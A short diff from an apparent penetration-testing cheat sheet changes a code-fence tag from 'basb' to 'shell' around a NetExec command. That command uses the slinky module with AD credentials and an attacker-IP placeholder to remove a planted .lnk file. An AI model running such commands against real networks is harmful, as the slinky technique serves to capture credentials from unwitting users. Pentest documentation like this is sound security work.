@@ -331,7 +331,7 @@ How to pentest like a Gunnaj
   ```
    
   ### Remove the lnk file
-  ```basb
+  ```shell
   NetExec -smb <Target_IP> -u <AD_user> -p <AD_password> -M slinky -o NAME=<filename> SERVER=<attacker_IP> CLEANUP=True
   ```
     
